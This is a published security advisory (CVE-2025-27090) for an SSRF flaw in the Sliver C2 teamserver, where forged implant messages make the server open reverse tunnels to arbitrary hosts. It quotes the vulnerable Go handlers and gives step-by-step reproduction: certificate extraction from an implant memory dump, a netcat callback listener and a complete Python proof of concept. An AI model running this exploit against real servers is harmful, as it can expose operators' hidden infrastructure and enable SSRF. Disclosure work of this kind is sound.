{
  "id": "GHSA-fh4v-v779-4g2w",
  "modified": "2025-03-03T19:41:53.796812Z",
  "published": "2025-02-19T21:11:33Z",
  "aliases": [
    "CVE-2025-27090",
    "GO-2025-3472"
  ],
  "summary": "SSRF in sliver teamserver",
  "details": "### Summary\nThe reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so\n\n\n### Reproduction steps\nRun server\n```\nwget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux\nchmod +x sliver-server_linux\n./sliver-server_linux\n```\n\nGenerate binary\n```\ngenerate --mtls 127.0.0.1:8443\n```\n\nRun it on windows, then `Task manager -\u003e find process -\u003e Create memory dump file`\n\n\nInstall RogueSliver and get the certs\n```\ngit clone https://github.com/ACE-Responder/RogueSliver.git\npip3 install -r requirements.txt --break-system-packages\npython3 ExtractCerts.py implant.dmp\n```\n\nStart callback listener. Teamserver will connect when POC is run and send \"ssrf poc\" to nc\n```\nnc -nvlp 1111\n```\n\nRun the poc (pasted at bottom of this file)\n```\npython3 poc.py \u003cSLIVER IP\u003e \u003cMTLS PORT\u003e \u003cCALLBACK IP\u003e \u003cCALLBACK PORT\u003e\npython3 poc.py 192.168.1.33 8443 44.221.186.72 1111\n```\n\n\n### Details\nWe see here an envelope is read from the connection and if the envelope.Type matches a handler the handler will be executed\n```go\nfunc handleSliverConnection(conn net.Conn) {\n\tmtlsLog.Infof(\"Accepted incoming connection: %s\", conn.RemoteAddr())\n\timplantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())\n\n\tdefer func() {\n\t\tmtlsLog.Debugf(\"mtls connection closing\")\n\t\tconn.Close()\n\t\timplantConn.Cleanup()\n\t}()\n\n\tdone := make(chan bool)\n\tgo func() {\n\t\tdefer func() {\n\t\t\tdone \u003c- true\n\t\t}()\n\t\thandlers := serverHandlers.GetHandlers()\n\t\tfor {\n\t\t\tenvelope, err := socketReadEnvelope(conn)\n\t\t\tif err != nil {\n\t\t\t\tmtlsLog.Errorf(\"Socket read error %v\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\timplantConn.UpdateLastMessage()\n\t\t\tif envelope.ID != 0 {\n\t\t\t\timplantConn.RespMutex.RLock()\n\t\t\t\tif resp, ok := implantConn.Resp[envelope.ID]; ok {\n\t\t\t\t\tresp \u003c- envelope // Could deadlock, maybe want to investigate better solutions\n\t\t\t\t}\n\t\t\t\timplantConn.RespMutex.RUnlock()\n\t\t\t} else if handler, ok := handlers[envelope.Type]; ok {\n\t\t\t\tmtlsLog.Debugf(\"Received new mtls message type %d, data: %s\", envelope.Type, envelope.Data)\n\t\t\t\tgo func() {\n\t\t\t\t\trespEnvelope := handler(implantConn, envelope.Data)\n\t\t\t\t\tif respEnvelope != nil {\n\t\t\t\t\t\timplantConn.Send \u003c- respEnvelope\n\t\t\t\t\t}\n\t\t\t\t}()\n\t\t\t}\n\t\t}\n\t}()\n\nLoop:\n\tfor {\n\t\tselect {\n\t\tcase envelope := \u003c-implantConn.Send:\n\t\t\terr := socketWriteEnvelope(conn, envelope)\n\t\t\tif err != nil {\n\t\t\t\tmtlsLog.Errorf(\"Socket write failed %v\", err)\n\t\t\t\tbreak Loop\n\t\t\t}\n\t\tcase \u003c-done:\n\t\t\tbreak Loop\n\t\t}\n\t}\n\tmtlsLog.Debugf(\"Closing implant connection %s\", implantConn.ID)\n}\n```\n\nThe available handlers:\n```go\nfunc GetHandlers() map[uint32]ServerHandler {\n\treturn map[uint32]ServerHandler{\n\t\t// Sessions\n\t\tsliverpb.MsgRegister:    registerSessionHandler,\n\t\tsliverpb.MsgTunnelData:  tunnelDataHandler,\n\t\tsliverpb.MsgTunnelClose: tunnelCloseHandler,\n\t\tsliverpb.MsgPing:        pingHandler,\n\t\tsliverpb.MsgSocksData:   socksDataHandler,\n\n\t\t// Beacons\n\t\tsliverpb.MsgBeaconRegister: beaconRegisterHandler,\n\t\tsliverpb.MsgBeaconTasks:    beaconTasksHandler,\n\n\t\t// Pivots\n\t\tsliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,\n\t\tsliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,\n\t}\n}\n```\n\nIf we send an envelope with the envelope.Type equaling MsgTunnelData, we will enter the `tunnelDataHandler` function\n```go\n// The handler mutex prevents a send on a closed channel, without it\n// two handlers calls may race when a tunnel is quickly created and closed.\nfunc tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {\n\tsession := core.Sessions.FromImplantConnection(implantConn)\n\tif session == nil {\n\t\tsessionHandlerLog.Warnf(\"Received tunnel data from unknown session: %v\", implantConn)\n\t\treturn nil\n\t}\n\ttunnelHandlerMutex.Lock()\n\tdefer tunnelHandlerMutex.Unlock()\n\ttunnelData := \u0026sliverpb.TunnelData{}\n\tproto.Unmarshal(data, tunnelData)\n\n\tsessionHandlerLog.Debugf(\"[DATA] Sequence on tunnel %d, %d, data: %s\", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)\n\n\trtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)\n\tif rtunnel != nil \u0026\u0026 session.ID == rtunnel.SessionID {\n\t\tRTunnelDataHandler(tunnelData, rtunnel, implantConn)\n\t} else if rtunnel != nil \u0026\u0026 session.ID != rtunnel.SessionID {\n\t\tsessionHandlerLog.Warnf(\"Warning: Session %s attempted to send data on reverse tunnel it did not own\", session.ID)\n\t} else if rtunnel == nil \u0026\u0026 tunnelData.CreateReverse == true {\n\t\tcreateReverseTunnelHandler(implantConn, data)\n\t\t//RTunnelDataHandler(tunnelData, rtunnel, implantConn)\n\t} else {\n\t\ttunnel := core.Tunnels.Get(tunnelData.TunnelID)\n\t\tif tunnel != nil {\n\t\t\tif session.ID == tunnel.SessionID {\n\t\t\t\ttunnel.SendDataFromImplant(tunnelData)\n\t\t\t} else {\n\t\t\t\tsessionHandlerLog.Warnf(\"Warning: Session %s attempted to send data on tunnel it did not own\", session.ID)\n\t\t\t}\n\t\t} else {\n\t\t\tsessionHandlerLog.Warnf(\"Data sent on nil tunnel %d\", tunnelData.TunnelID)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\n\nThe `createReverseTunnelHandler` reads the envelope, creating a socket for `req.Rportfwd.Host` and `req.Rportfwd.Port`.  It will write `recv.Data` to it\n```go\nfunc createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {\n\tsession := core.Sessions.FromImplantConnection(implantConn)\n\n\treq := \u0026sliverpb.TunnelData{}\n\tproto.Unmarshal(data, req)\n\n\tvar defaultDialer = new(net.Dialer)\n\n\tremoteAddress := fmt.Sprintf(\"%s:%d\", req.Rportfwd.Host, req.Rportfwd.Port)\n\n\tctx, cancelContext := context.WithCancel(context.Background())\n\n\tdst, err := defaultDialer.DialContext(ctx, \"tcp\", remoteAddress)\n\t//dst, err := net.Dial(\"tcp\", remoteAddress)\n\tif err != nil {\n\t\ttunnelClose, _ := proto.Marshal(\u0026sliverpb.TunnelData{\n\t\t\tClosed:   true,\n\t\t\tTunnelID: req.TunnelID,\n\t\t})\n\t\timplantConn.Send \u003c- \u0026sliverpb.Envelope{\n\t\t\tType: sliverpb.MsgTunnelClose,\n\t\t\tData: tunnelClose,\n\t\t}\n\t\tcancelContext()\n\t\treturn nil\n\t}\n\n\tif conn, ok := dst.(*net.TCPConn); ok {\n\t\t// {{if .Config.Debug}}\n\t\t//log.Printf(\"[portfwd] Configuring keep alive\")\n\t\t// {{end}}\n\t\tconn.SetKeepAlive(true)\n\t\t// TODO: Make KeepAlive configurable\n\t\tconn.SetKeepAlivePeriod(1000 * time.Second)\n\t}\n\n\ttunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)\n\trtunnels.AddRTunnel(tunnel)\n\tcleanup := func(reason error) {\n\t\t// {{if .Config.Debug}}\n\t\tsessionHandlerLog.Infof(\"[portfwd] Closing tunnel %d (%s)\", tunnel.ID, reason)\n\t\t// {{end}}\n\t\ttunnel := rtunnels.GetRTunnel(tunnel.ID)\n\t\trtunnels.RemoveRTunnel(tunnel.ID)\n\t\tdst.Close()\n\t\tcancelContext()\n\t}\n\n\tgo func() {\n\t\ttWriter := tunnelWriter{\n\t\t\ttun:  tunnel,\n\t\t\tconn: implantConn,\n\t\t}\n\t\t// portfwd only uses one reader, hence the tunnel.Readers[0]\n\t\tn, err := io.Copy(tWriter, tunnel.Readers[0])\n\t\t_ = n // avoid not used compiler error if debug mode is disabled\n\t\t// {{if .Config.Debug}}\n\t\tsessionHandlerLog.Infof(\"[tunnel] Tunnel done, wrote %v bytes\", n)\n\t\t// {{end}}\n\n\t\tcleanup(err)\n\t}()\n\n\ttunnelDataCache.Add(tunnel.ID, req.Sequence, req)\n\n\t// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading\n\t// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence\n\t// is used here whereas WriteSequence is used for data written back to the server\n\n\t// Go through cache and write all sequential data to the reader\n\tfor recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {\n\t\t// {{if .Config.Debug}}\n\t\t//sessionHandlerLog.Infof(\"[tunnel] Write %d bytes to tunnel %d (read seq: %d)\", len(recv.Data), recv.TunnelID, recv.Sequence)\n\t\t// {{end}}\n\t\ttunnel.Writer.Write(recv.Data)\n\n\t\t// Delete the entry we just wrote from the cache\n\t\ttunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())\n\t\ttunnel.IncReadSequence() // Increment sequence counter\n\n\t\t// {{if .Config.Debug}}\n\t\t//sessionHandlerLog.Infof(\"[message just received] %v\", tunnelData)\n\t\t// {{end}}\n\t}\n\n\t//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.\n\t//Send a Resend packet to have the msg resent from the cache\n\tif tunnelDataCache.Len(tunnel.ID) \u003e 3 {\n\t\tdata, err := proto.Marshal(\u0026sliverpb.TunnelData{\n\t\t\tSequence: tunnel.WriteSequence(), // The tunnel write sequence\n\t\t\tAck:      tunnel.ReadSequence(),\n\t\t\tResend:   true,\n\t\t\tTunnelID: tunnel.ID,\n\t\t\tData:     []byte{},\n\t\t})\n\t\tif err != nil {\n\t\t\t// {{if .Config.Debug}}\n\t\t\t//sessionHandlerLog.Infof(\"[shell] Failed to marshal protobuf %s\", err)\n\t\t\t// {{end}}\n\t\t} else {\n\t\t\t// {{if .Config.Debug}}\n\t\t\t//sessionHandlerLog.Infof(\"[tunnel] Requesting resend of tunnelData seq: %d\", tunnel.ReadSequence())\n\t\t\t// {{end}}\n\t\t\timplantConn.RequestResend(data)\n\t\t}\n\t}\n\treturn nil\n}\n```\n\n\n\n### Impact\nFor current POC, mostly just leaking teamserver origin IP behind redirectors. I am 99% sure you can get full read SSRF but POC is blind only right now\n\nTo exploit this for MTLS listeners, you will need MTLS keys\nFor HTTP listeners, you will need to generate valid nonce\nNot sure about other transport types\n\n\n\n### POC\nPOC code, it is not cleaned up at all, please forgive me\n```python\n#!/usr/bin/python\nimport sys\nimport time\nimport base64\nimport socket, ssl\nfrom RogueSliver.consts import msgs\nimport random\nimport struct\nimport RogueSliver.sliver_pb2 as sliver\nimport json\nimport argparse\nimport uuid\nfrom google.protobuf import json_format\nfrom rich import print\nimport random\nimport string\n\nssl_ctx = ssl.create_default_context()\nssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')\nssl_ctx.load_verify_locations('certs/ca.crt')\nssl_ctx.check_hostname = False\nssl_ctx.verify_mode = ssl.CERT_NONE\n\n\n\ndef generate_random_string(length=8):\n    # Combine letters and digits\n    characters = string.ascii_letters + string.digits\n    # Generate random string\n    random_string = ''.join(random.choice(characters) for _ in range(length))\n    return random_string\n\ndef rand_unicode(junk_sz):\n  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()\n  return(junk)\n\ndef junk_register(junk_sz):\n  n = generate_random_string()\n  register = {\n        \"Name\": \"chebuya\"+n,\n        \"Hostname\": \"chebuya.local\"+n,\n        \"Uuid\": \"uuid\"+n,\n        \"Username\": \"username\"+n,\n        \"Uid\": \"uid\"+n,\n        \"Gid\": \"gid\"+n,\n        \"Os\": \"os\"+n,\n        \"Arch\": \"arch\"+n,\n        \"Pid\": 10,\n        \"Filename\": \"filename\"+n,\n        \"ActiveC2\": \"activec2\"+n,\n        \"Version\": \"version\"+n,\n        \"ReconnectInterval\": 60,\n        \"ConfigID\": \"config_id\"+n,\n        \"PeerID\": -1,\n        \"Locale\": \"locale\" + n\n  }\n\n  return register\n\n\n\ndef make_ping_env():\n  reg = sliver.Ping()\n  json_format.Parse(json.dumps({}),reg)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('Ping')\n  envelope.Data = reg.SerializeToString()\n\n  return envelope\n\n\n\ndef make_rt_env():\n    \n    jdata = {\n            \"Data\": \"c3NyZiBwb2M=\",\n            \"Closed\": False,\n            \"Sequence\": 0,\n            \"Ack\": 0,\n            \"Resend\": False,\n            \"CreateReverse\": True,\n            \"rportfwd\": {\n                \"Port\": int(sys.argv[4]),\n                \"Host\": sys.argv[3],\n                \"TunnelID\": 0,\n            },\n            \"TunnelID\": 0,\n    }\n\n\n\n    reg = sliver.TunnelData()\n    json_format.Parse(json.dumps(jdata),reg)\n    envelope = sliver.Envelope()\n    envelope.Type = msgs.index('TunnelData')\n    envelope.Data = reg.SerializeToString()\n\n    return envelope\n\n\n\n\ndef send_envelope(envelope,ip,port):\n  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    with ssl_ctx.wrap_socket(s,) as ssock:\n      ssock.connect((ip,port))\n\n      print(len(envelope.SerializeToString()))\n      #data_len = struct.pack('!I', len(envelope.SerializeToString()) )\n      data_len = struct.pack('I', len(envelope.SerializeToString()) )\n\n\n\n\n      envelope3 = make_rt_env()\n      data_len3 = struct.pack('I', len(envelope3.SerializeToString()) )\n\n      print(data_len)\n\n      ssock.write(data_len + envelope.SerializeToString()) \n      ssock.write(data_len3 + envelope3.SerializeToString())\n\n\n\n    \n      # No idea why this is reqauired\n      while True:\n          time.sleep(2)\n          ssock.write(data_len3 + envelope3.SerializeToString())\n\n\n\ndef register_session(ip,port):\n  print('[yellow]\\[i][/yellow] Sending session registration.')\n  reg = sliver.Register()\n  json_format.Parse(json.dumps(junk_register(50)),reg)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('Register')\n  envelope.Data = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndef register_beacon(ip,port):\n  print('[yellow]\\[i][/yellow] Sending beacon registration.')\n  reg = sliver.BeaconRegister()\n  reg.ID = str(uuid.uuid4())\n  junk_sz = 50\n  reg.Interval = random.randint(0,10*junk_sz)\n  reg.Jitter = random.randint(0,10*junk_sz)\n  reg.NextCheckin = random.randint(0,10*junk_sz)\n  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('BeaconRegister')\n  envelope.Data = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndescription = '''\nFlood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.\n'''\n\nif __name__ == '__main__':\n  register_session(sys.argv[1], int(sys.argv[2]))\n```",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/bishopfox/sliver",
        "purl": "pkg:golang/github.com/bishopfox/sliver"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "1.5.26"
            },
            {
              "fixed": "1.5.43"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 1.5.42",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-fh4v-v779-4g2w/GHSA-fh4v-v779-4g2w.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27090"
    },
    {
      "type": "WEB",
      "url": "https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f"
    },
    {
      "type": "WEB",
      "url": "https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/BishopFox/sliver"
    }
  ]
}